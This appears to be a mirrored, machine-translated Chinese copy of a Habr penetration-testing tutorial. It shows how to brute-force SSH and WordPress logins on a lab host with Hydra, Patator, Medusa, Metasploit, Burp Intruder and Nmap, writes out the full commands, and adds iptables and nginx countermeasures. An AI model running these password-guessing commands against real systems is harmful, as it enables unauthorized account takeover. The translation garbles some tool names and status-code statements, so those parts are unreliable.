<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🥒 📶 🧙🏿 使用Kali Linux的暴力攻击 👌🏾 🏝️ 👦</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="蛮力攻击是解决数学问题的一种方法，其复杂性取决于所有可能解决方案的数量。 当攻击者尝试为帐户或服务选择用户名/密码时，术语“暴力本身”通常用于黑客攻击的上下文中。 

 考虑可用于对Kali Linux（Patator，Medusa，Hydra，Metasploit）和BurpSuite中可用的SS...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>使用Kali Linux的暴力攻击</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pentestit/blog/434216/"><img src="https://habrastorage.org/webt/zv/o2/x0/zvo2x0ojtk15u7uwaecj7kdpc-u.jpeg"><br><br> 蛮力攻击是解决数学问题的一种方法，其复杂性取决于所有可能解决方案的数量。 当攻击者尝试为帐户或服务选择用户名/密码时，术语“暴力本身”通常用于黑客攻击的上下文中。 <br><br> 考虑可用于对Kali Linux（Patator，Medusa，Hydra，Metasploit）和BurpSuite中可用的SSH和WEB服务进行暴力攻击的工具。 <br><a name="habracut"></a><br><blockquote> 本文提供的所有材料仅供教育使用。 禁止以非法和非法使用材料。 <br></blockquote><br><h2> 暴力破解 </h2><br> 例如，以测试计算机192.168.60.50尝试通过SSH查找用户测试的密码。 我们将使用标准rockyou.txt词典中的常用密码。 <br><br><hr><br>  <b>拍手</b> <br> 要使用Patator选择密码，请使用以下命令： <br><br> <code>patator ssh_login host=192.168.60.50 user=test password=FILE0 0=/root/wordlist -x ignore:mesg='Authentication failed'</code> <br> <br> 其中： <br>  <b>ssh_login-</b>必需的模块 <br>  <b>主人</b>是我们的目标 <br>  <b>用户</b> -选择用于多次选择的密码或文件的<b>用户</b>登录名 <br>  <b>密码</b> -带密码的字典 <br>  <b>-x忽略：mesg ='验证失败'</b> -该命令不显示包含此消息的行。 过滤参数是单独选择的。 <br><br><img src="https://habrastorage.org/webt/yk/9s/qg/yk9sqghqquqm8814u0jh7sgonac.png" alt="图片"><br><br><hr><br>  <b>九头蛇</b> <br> 要使用Hydra选择密码，请执行以下命令： <br><br> <code>hydra -V -f -t 4 -l test -P /root/wordlist ssh://192.168.60.50</code> <br> <br> 其中： <br>  <b>-V-</b>在迭代期间显示一对用户名和密码 <br>  <b>-f-</b>找到指定登录名的密码后立即停止 <br>  <b>-P-</b>带有密码的字典路径 <br>  <b>ssh：//192.168.60.50-</b>受害者的服务指示和IP地址 <br><br><img src="https://habrastorage.org/webt/ys/qd/xv/ysqdxvgtpatu8to2q_lmdrzp9y0.png" alt="图片"><br><br><hr><br>  <b>美杜莎</b> <br> 要使用Medusa选择密码，请执行以下命令： <br><br> <code>medusa -h 192.168.60.50 -u test -P /root/wordlist -M ssh -f -v 6</code> <br> <br> 其中： <br>  <b>-h-</b>受害者IP地址 <br>  <b>-u-</b>登录 <br>  <b>-P-</b>字典路径 <br>  <b>-M-</b>模块选择 <br>  <b>-f-</b>在找到有效的用户名/密码对后停止 <br>  <b>-v-</b>在选择过程中设置消息在屏幕上的显示 <br><br><img src="https://habrastorage.org/webt/p_/i4/df/p_i4dfjf697ssbosu6f1fxzj0qk.png" alt="图片"><br><br><hr><br>  <b>Metasploit</b> <br> 我们将搜索用于对SSH进行暴力攻击的工具： <br>  <code>search ssh_login</code>并得到答案： <br><br><img src="https://habrastorage.org/webt/z1/kz/s3/z1kzs3syz3jdf7jcpjnxzj37d5y.png" alt="图片"><br><br> 我们使用以下模块： <br><br> <code>use auxiliary/scanner/ssh/ssh_login</code> <br> <br> 要查看必要的参数，请使用<code>show options</code>命令。 对我们来说是： <br> 主机-受害者IP地址 <br> 港口 <br>  <b>用户名</b> -SSH登录 <br>  <b>userpass_file-</b>字典的路径 <br>  <b>stop_on_success-</b>在存在用户名/密码对时立即停止 <br>  <b>线程</b> - <b>线程</b>数 <br><br><img src="https://habrastorage.org/webt/yl/jd/tn/yljdtnsmzwi4663yl4swbrvg8zg.png" alt="图片"><br><br> 通过“ <b>set</b> ”命令指示必要的参数。 <br><br> <code>set rhosts 192.168.60.50</code> <br> <code>set username test <br> set userpass_file /root/wordlist <br> set stop_on_success yes <br> set threads 4 <br> set rport 22</code> <br> <br> 指定了必要的参数后，我们键入“ <b>run</b> ”命令并等待。 <br><br><img src="https://habrastorage.org/webt/8h/wp/nt/8hwpnt8bls7vuuv0knw86hx-kby.png" alt="图片"><br><br><h3> 对抗 </h3><br> 使用防火墙限制建立的连接数。  iptables设置示例： <br><br>  <code>-A INPUT -i eth0 -p tcp --dport 22 -m connlimit --connlimit-above 1 --connlimit-mask 32 -j REJECT --reject-with tcp-reset</code> 。 <br><br> 这样的规则会将每个IP地址对SSH的访问限制为每秒1个连接，这使搜索变得非常复杂。 同样，有效的解决方案可以是使用两因素身份验证（例如，使用eToken）或使用密钥对的身份验证，以及使用基于IP地址的ACL。 <br><br><h2> 蛮力WordPress </h2><br> 让我们看另一个示例-选择Web表单授权窗口的密码。 <br><br><img src="https://habrastorage.org/webt/sv/lo/oi/svlooiyalsm5q11pt3pslw_1cqo.png" alt="图片"><br><br> 例如，我们将从wordpress管理员帐户中选择密码。 <br><br><hr><br>  <b>Burpsuite</b> <br> 首先，我们需要了解授权过程是如何发生的。 为此，我们将使用BurpSuite。 我们需要尝试使用任何密码登录并登录，以查看通过BurpSuite发出的请求。 <br><br><img src="https://habrastorage.org/webt/gb/zo/2c/gbzo2cqqvnl3tuxwcpbbujk1zgs.png" alt="图片"><br><br> 好吧，我们看到了POST授权请求，我们将使用它。 <br>  BODY指示检查了哪个登录名和密码，这意味着我们可以尝试替换自己需要的值。 <br> 我们将此请求传递给Intruder，然后在此处选择攻击所需的参数。 在“有效载荷位置”项中，我们将攻击类型保留为狙击手，但为进行验证，我们仅保留了pwd参数。 因此，攻击只会更改此参数。 <br><br><img src="https://habrastorage.org/webt/ru/a4/oi/rua4oiu-gz5hilmjujvajblxgs8.png" alt="图片"><br><br> 我们加载必要的字典并开始攻击。 <br><br><img src="https://habrastorage.org/webt/qf/dw/dt/qfdwdtl1-e6gohgyhzsllu-dny8.png" alt="图片"><br><br> 从Web应用程序的行为来看，我们看到错误的密码返回了响应代码200。在搜索字典之后，我们看到其中一个密码给出了代码302的答案-是正确的。 <br><br><img src="https://habrastorage.org/webt/lf/cz/tz/lfcztzibwkvx8rrppdbfs3li-ny.png" alt="图片"><br><br> 这种蛮力方法比使用Patator，Hydra，Medusa等时花费的时间长得多。 即使我们拿着一本小词典，BurpSuite也在该词典上迭代了约40分钟。 <br><br><hr><br>  <b>九头蛇</b> <br> 让我们尝试使用Hydra查找密码。 <br> 我们已经知道，如果授权不正确，则返回代码200，如果授权不成功，则返回代码302。让我们尝试使用此信息。 <br> 首先，使用以下命令： <br><br> <code>hydra -V -f -l admin -P /root/wordlist -t 4 http-post-form://192.168.60.50 -m "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&amp;testcookie=1:S=302"</code> <br> <br> 在这里，我们指示所需的参数： <br>  <b>-l-</b>用户名 <br>  <b>-P-</b>带有密码的字典 <br>  <b>-t-</b>线程数 <br>  <b>http-post-form-表单</b>类型，我们有POST。 <br>  <b>/wp-login.php</b>是授权页面的URL <br>  <b>^ USER ^</b> -显示替换用户名的位置 <br>  <b>^通过^</b> -显示在字典中替换密码的位置 <br>  <b>S = 302-</b>指示哪个答案依赖Hydra。 在我们的情况下，成功授权后的答案是302。 <br><br><img src="https://habrastorage.org/webt/jd/ft/yp/jdftypn_8za5oyqcdattmnwcwce.png" alt="图片"><br><br><hr><br>  <b>拍手</b> <br> 众所周知，如果授权失败，则返回代码200，如果授权失败，则返回302。我们将使用与Hydra相同的原理： <br> 通过以下命令执行启动： <br><br> <code>patator http_fuzz url=http://192.168.60.50/wp-login.php method=POST body='log=admin&amp;pwd=FILE0&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&amp;testcookie=1' 0=/root/wordlist -t 4 before_urls=http://192.168.60.50/wp-login.php -x ignore:code=200 accept_cookie=1</code> <br> <br>  <b>http_fuzz-</b>暴力HTTP攻击模块 <br>  <b>url-</b>具有授权的页面地址 <br>  <b>FILE0-</b>带有密码的字典路径 <br>  <b>正文</b> -授权期间在POST请求中传输的信息 <br>  <b>-t-</b>线程数 <br>  <b>-x-</b>在这种情况下，我们指定了不显示包含代码为200的参数的消息行的命令 <br>  <b>accept_cookie-</b>保存cookie参数并将其传递给下一个请求 <br> 结果，我们设法找到了密码。 <br><br><img src="https://habrastorage.org/webt/m0/el/tw/m0eltwkb6kp6d2joca248ceof2o.png" alt="图片"><br><br><hr><br>  <b>地图</b> <br> 如果您使用带有相应参数的<b>http-wordpress-brute</b>脚本，则Nmap实用程序允许选择Web授权表单的密码： <br>  <b>--script-args-</b>添加参数 <br>  <b>user</b>或<b>userdb-</b>登录名或带有登录名的文件 <br>  <b>pass</b>或<b>passdb-</b>指定密码或字典 <br>  <b>线程</b> - <b>线程</b>数 <br>  <b>firstonly = true-</b>在第一个正确的密码后显示结果 <br><br> <code>nmap 192.168.60.50 --script http-wordpress-brute --script-args 'user= admin,passdb= /root/wordlist, http-wordpress-brute.thread=3, brute.firstonly=true'</code> <br> <br><img src="https://habrastorage.org/webt/kj/-k/dn/kj-kdnrb0qxnjem-x4rfrebahxa.png" alt="图片"><br><br><h3> 对抗 </h3><br> 使用iptables（类似于SSH）​​和nginx限制（复杂）对Web应用程序的暴力攻击。 为此，创建一个限制区域： <br> <code>... <br> limit_req_zone $binary_remote_addr zone=req_limits:10m rate=30r/s; <br> ... <br></code> <br> 并使用它： <br> <code>location / { <br> ... <br> limit_req zone=req_limits burst=10; <br> limit_req_status 429; <br> ... <br> } <br></code> <br> 这样的设置会将请求从一个IP地址的数量限制为每秒40个。 <br><br> 要使枚举任务复杂化，可以使用以下方法： <br>  -使用防火墙和其他软件来限制对受保护服务的呼叫次数。 您可以在文章中了解如何使用机器学习来检测此类攻击（包括分布式攻击）。 <br>  -使用防止快速验证密钥正确性的工具（例如，验证码）。 <br><br><h2> 结论 </h2><br> 在本文中，我们简要地研究了一些流行的工具。 您可以按照以下准则降低密码猜测的风险： <br>  -使用耐密码的密码； <br>  -请勿使用个人信息创建密码，例如：出生日期或姓名+出生日期或手机； <br>  -定期更改密码； <br>  -在所有帐户上使用唯一的密码。 <br><br> 很少有人遵循这样的建议（以及关于安全Web开发的建议），因此您需要使用各种软件解决方案，这些解决方案可以使您： <br>  -通过IP地址限制连接，或者，如果不可能，则限制与服务的同时连接数（使用iptables，nginx等）； <br>  -使用两因素验证； <br>  -使用SIEM， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">WAF</a>或其他工具（例如，fail2ban）检测并阻止此类攻击。 </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN434216/">https://habr.com/ru/post/zh-CN434216/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN434206/index.html">喷气飞机经销商ok.ru/music</a></li>
<li><a href="../zh-CN434208/index.html">如何拯救我们的黑色星期五</a></li>
<li><a href="../zh-CN434210/index.html">HeadHunter站在Mobius 2018莫斯科的Android测验竞赛分析</a></li>
<li><a href="../zh-CN434212/index.html">特斯拉大厦。 雷电击中摩天大楼附近时，会发生什么？</a></li>
<li><a href="../zh-CN434214/index.html">Java动态代理：它是什么以及如何使用？</a></li>
<li><a href="../zh-CN434218/index.html">游戏“魔兽世界” 3.3.5a示例中的简单Java Clicker机器人</a></li>
<li><a href="../zh-CN434220/index.html">进入Aeronet：在虚拟环境中启动自主直升机</a></li>
<li><a href="../zh-CN434222/index.html">亚马逊地面站出租-接收和处理卫星数据</a></li>
<li><a href="../zh-CN434224/index.html">12月24日至30日在莫斯科举行的数字活动</a></li>
<li><a href="../zh-CN434226/index.html">Habrautility用于收集habrablog中的habrastatistics</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>